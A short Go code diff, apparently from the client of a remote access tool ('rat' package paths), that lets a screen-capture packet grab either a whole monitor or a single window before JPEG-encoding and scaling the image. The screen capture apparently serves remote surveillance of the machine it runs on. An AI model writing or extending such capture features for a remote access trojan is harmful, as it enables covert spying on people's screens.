@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"image"
 	"image/jpeg"
 	"rat/client/screen"
 	"rat/shared/network/header"
@@ -44,11 +45,17 @@ func (packet *ScreenPacket) Init() {
 
 	var w bytes.Buffer
 
-	if handle >= len(screen.Monitors) {
-		handle = 0
-	}
+	var img image.Image
 
-	img := screen.Capture(screen.Monitors[handle])
+	if monitor {
+		if handle >= len(screen.Monitors) {
+			handle = 0
+		}
+
+		img = screen.Capture(screen.Monitors[handle])
+	} else {
+		img = screen.CaptureWindow(handle)
+	}
 
 	if packet.Scale > 0 && packet.Scale < 1.0 {
 		width := float32(img.Bounds().Max.X) * packet.Scale
